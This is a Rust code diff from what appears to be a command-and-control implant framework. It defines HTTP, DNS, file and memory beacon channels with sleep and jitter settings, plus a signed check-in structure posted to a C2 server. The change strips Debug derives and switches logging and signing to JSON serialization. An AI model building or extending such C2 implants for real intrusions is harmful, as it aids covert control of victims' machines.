@@ -30,7 +30,7 @@ use log::info;
 
 
 
-#[derive(Serialize, Deserialize, Debug, PartialEq, Clone)]
+#[derive(Serialize, Deserialize, PartialEq, Clone)]
 pub enum Link {
     HTTP(HTTPLink),
     DNS(DNSLink),
@@ -40,7 +40,7 @@ pub enum Link {
 }
 impl Link {
     pub fn print_link_compact(&self) {
-        info!("{:?}", self);
+        info!("{:?}", serde_json::to_string(self).unwrap_or_default());
     }
 
     pub fn fetch_config(
@@ -105,14 +105,14 @@ impl Link {
     }
 }
 
-#[derive(Serialize, Deserialize, Debug, PartialEq, Clone)]
+#[derive(Serialize, Deserialize, PartialEq, Clone)]
 pub struct HTTPLink {
     pub url: String,
     pub dataoperation: Vec<DataOperation>,
     pub sleep: u64,
     pub jitt: u64,
 }
-#[derive(Serialize, Deserialize, Debug, PartialEq, Clone)]
+#[derive(Serialize, Deserialize, PartialEq, Clone)]
 pub struct DNSLink {
     pub dns: String,
     pub dataoperation: Vec<DataOperation>,
@@ -120,7 +120,7 @@ pub struct DNSLink {
     pub jitt: u64,
 }
 
-#[derive(Serialize, Deserialize, Debug, PartialEq, Clone)]
+#[derive(Serialize, Deserialize, PartialEq, Clone)]
 pub struct FileLink {
     pub file_path: String,
     pub dataoperation: Vec<DataOperation>,
@@ -128,7 +128,7 @@ pub struct FileLink {
     pub jitt: u64,
 }
 
-#[derive(Serialize, Deserialize, Debug, PartialEq, Clone)]
+#[derive(Serialize, Deserialize, PartialEq, Clone)]
 pub struct MemoryLink {
     pub memory_nb: i32,
     pub dataoperation: Vec<DataOperation>,
@@ -136,7 +136,7 @@ pub struct MemoryLink {
     pub jitt: u64,
 }
 
-#[derive(Serialize, Deserialize, Debug, PartialEq, Clone)]
+#[derive(Serialize, Deserialize, PartialEq, Clone)]
 pub struct HTTPPostC2Link {
     pub url: String,
     pub dataoperation: Vec<DataOperation>,
@@ -386,12 +386,12 @@ impl LinkFetch for HTTPLink {
     }
 }
 
-#[derive(Serialize, Deserialize, Debug, PartialEq, Clone)]
+#[derive(Serialize, Deserialize, PartialEq, Clone)]
 pub struct LightPayload {
     pub todo: String,
 }
 
-#[derive(Serialize, Deserialize, Debug, PartialEq, Clone)]
+#[derive(Serialize, Deserialize, PartialEq, Clone)]
 pub struct PostToC2 {
     pub session_id: String,
     pub hostname: String,
@@ -507,7 +507,7 @@ impl LinkFetch for HTTPPostC2Link {
             sign_bytes: vec![],
         };
 
-        let sign_data = format!("{:?}", post_data);
+        let sign_data = format!("{}", serde_json::to_string(&post_data).unwrap_or_default());
         let sig: signature::Signature = key_pair.sign(sign_data.as_bytes());
         let sign_bytes = sig.as_ref().to_vec();
         post_data.peer_public_key_bytes = peer_public_key_bytes;
